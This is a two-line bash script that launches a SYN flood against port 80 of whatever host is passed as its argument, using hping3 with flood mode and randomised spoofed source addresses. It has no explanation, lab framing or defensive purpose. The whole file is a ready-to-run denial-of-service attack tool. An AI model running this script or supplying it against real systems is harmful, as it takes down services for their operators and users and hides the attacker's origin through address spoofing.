#!/bin/bash
hping3 --flood --rand-source -S -p 80 $1
